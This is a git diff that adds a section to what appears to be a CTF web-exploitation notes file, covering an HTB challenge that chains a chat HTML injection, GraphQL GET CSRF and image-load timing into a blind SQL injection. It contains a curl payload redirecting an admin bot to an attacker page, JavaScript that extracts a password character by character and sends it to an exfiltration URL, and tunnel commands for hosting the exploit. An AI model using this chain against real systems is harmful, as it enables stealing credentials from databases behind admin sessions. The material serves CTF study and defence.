@@ -22,6 +22,7 @@
 - [JPEG+HTML Polyglot XSS (EHAX 2026)](#jpeghtml-polyglot-xss-ehax-2026)
 - [JSFuck Decoding](#jsfuck-decoding)
 - [Admin Bot javascript: URL Scheme Bypass (DiceCTF 2026)](#admin-bot-javascript-url-scheme-bypass-dicectf-2026)
+- [XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)](#xs-leak-via-image-load-timing--graphql-csrf-htb-grandmonty)
 
 ---
 
@@ -364,3 +365,85 @@ if (!['http:', 'https:'].includes(u.protocol)) {
 ```
 
 **Key insight:** `new URL()` is a **syntax** validator, not a **security** validator. It accepts `javascript:`, `data:`, `file:`, `blob:`, and other dangerous schemes. Any admin bot or SSRF handler using `new URL()` alone for validation is vulnerable. Always allowlist protocols explicitly.
+
+---
+
+## XS-Leak via Image Load Timing + GraphQL CSRF (HTB GrandMonty)
+
+**Pattern:** Admin bot visits attacker page → JavaScript makes cross-origin requests to `localhost` GraphQL endpoint → measures time-based SQLi via image load timing → exfiltrates data character by character.
+
+### Why it works
+
+1. **GraphQL GET CSRF:** Many GraphQL implementations accept GET requests (not just POST+JSON). GET requests with images bypass CORS preflight — no `OPTIONS` check needed.
+2. **Bot runs on localhost:** The admin bot's browser can reach `localhost:1337/graphql` which is restricted from external access.
+3. **Image error timing:** `new Image().src = url` fires `onerror` after the server responds. If SQL `SLEEP(1)` executes, the response is slow → timing difference reveals whether a character matches.
+
+### Step 1 — Redirect bot via meta refresh (CSP bypass)
+
+When CSP blocks inline scripts, use HTML injection with `<meta>` redirect:
+```bash
+curl -b cookies.txt "http://TARGET/api/chat/send" \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"message": "<meta http-equiv=\"refresh\" content=\"0;url=https://ATTACKER/exploit.html\" />"}'
+```
+
+The bot navigates to the attacker page, where JavaScript executes freely (different origin, no CSP restriction).
+
+### Step 2 — Timing oracle via image loads
+
+```javascript
+const imageLoadTime = (src) => {
+    return new Promise((resolve) => {
+        let start = performance.now();
+        const img = new Image();
+        img.onload = () => resolve(0);
+        img.onerror = () => resolve(performance.now() - start);
+        img.src = src;
+    });
+};
+
+const xsLeaks = async (query) => {
+    let imgURL = 'http://127.0.0.1:1337/graphql?query=' +
+        encodeURIComponent(query);
+    let delay = await imageLoadTime(imgURL);
+    return delay >= 1000;  // SLEEP(1) threshold
+};
+```
+
+### Step 3 — Character-by-character extraction
+
+```javascript
+let sqlTemp = `query {
+    RansomChat(enc_id: "123' and __LEFT__ = __RIGHT__)-- -")
+    {id, enc_id, message, created_at} }`;
+
+let readQueryTemp = `(select sleep(1) from dual where
+    BINARY(SUBSTRING((select password from db.users
+    where username = 'target'),__POS__,1))`;
+
+let flag = '';
+for (let pos = 1; ; pos++) {
+    for (let c of charset) {
+        let readQuery = readQueryTemp.replace('__POS__', pos);
+        let sql = sqlTemp.replace('__LEFT__', readQuery)
+                         .replace('__RIGHT__', `'${c}'`);
+        if (await xsLeaks(sql)) {
+            flag += c;
+            new Image().src = exfilURL + '?d=' + encodeURIComponent(flag);
+            break;
+        }
+    }
+}
+```
+
+### Step 4 — Host exploit and tunnel
+
+```bash
+# Cloudflare Tunnel (recommended — no interstitial pages unlike ngrok)
+cloudflared tunnel --url http://localhost:8888
+python3 -m http.server 8888
+```
+
+**Key insight:** GraphQL GET requests bypass CORS preflight entirely — `new Image().src` triggers a simple GET that doesn't need `OPTIONS`. Combined with timing-based SQLi (`SLEEP()`), image `onerror` timing becomes a boolean oracle. The bot's localhost access turns a localhost-only SQLi into a remotely exploitable vulnerability.
+
+**Detection:** Chat/message features with HTML injection + admin bot + GraphQL endpoint with SQL injection + localhost-only restrictions.
